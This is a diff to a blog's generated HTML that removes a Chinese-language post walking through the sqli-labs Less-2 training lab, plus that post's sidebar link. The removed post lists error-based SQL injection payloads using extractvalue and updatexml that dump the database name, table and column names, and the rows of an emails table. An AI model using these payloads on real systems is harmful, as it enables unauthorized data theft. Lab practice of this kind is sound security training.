@@ -64,83 +64,6 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-SERIES-2" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/03/24/SERIES-2/" class="article-date">
-  <time datetime="2022-03-24T12:56:39.000Z" itemprop="datePublished">2022-03-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/24/SERIES-2/">vulfocus/sqli-labs  Less2  SQLI DUMB SERIES-2</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>输入?id=1后页面显示登录成功，用户名Dumb密码Dumb</p>
-<img src="/2022/03/24/SERIES-2/1.png" class="">
-
-
-
-<p>输入?id=1’ 出现报错</p>
-<img src="/2022/03/24/SERIES-2/2.png" class="">
-
-
-
-<p>输入?id=1 and (extractvalue(‘anything’,’/x/xx’))–+<br>报错注入执行成功</p>
-<img src="/2022/03/24/SERIES-2/3.png" class="">
-
-
-
-<p>输入?id=1 and (extractvalue(1,concat(1,(select database()))))<br>报出用户名信息</p>
-<img src="/2022/03/24/SERIES-2/4.png" class="">
-
-
-
-<p>updatexml和extractvalue都是基于xml语法<br>输入?id=1 and (updatexml(1,concat(1,(select database())),1))<br>报出用户名信息</p>
-<img src="/2022/03/24/SERIES-2/5.png" class="">
-
-
-
-<p>输入?id=1 and (updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1))<br>爆出表名</p>
-<img src="/2022/03/24/SERIES-2/6.png" class="">
-
-
-
-<p>输入?id=1 and (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=’emails’)),1))<br>报出emails表中的列名</p>
-<img src="/2022/03/24/SERIES-2/7.png" class="">
-
-
-
-<p>输入?id=1 and (updatexml(1,concat(0x7e,(select group_concat(id,0x3a,email_id,0x7e) from emails )),1))<br>报出emails表内容，由于位数限制只能爆出前两个</p>
-<img src="/2022/03/24/SERIES-2/8.png" class="">
-
-
-
-<p>添上查询条件where id not in(1)不看id为1的数据<br>输入?id=1 and (updatexml(1,concat(0x3e,(select group_concat(id,0x3a,email_id,0x7e) from emails where id not in(1) )),1))<br>报出id2,3的数据</p>
-<img src="/2022/03/24/SERIES-2/9.png" class="">
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/24/SERIES-2/" data-id="cl1502wa90000r0ws8a1l6tti" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
     <article id="post-SERIES-1" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2022/03/24/SERIES-1/" class="article-date">
@@ -442,10 +365,6 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
-        
-          <li>
-            <a href="/2022/03/24/SERIES-2/">vulfocus/sqli-labs  Less2  SQLI DUMB SERIES-2</a>
-          </li>
         
           <li>
             <a href="/2022/03/24/SERIES-1/">vulfocus/sqli-labs  Less1-Less21</a>
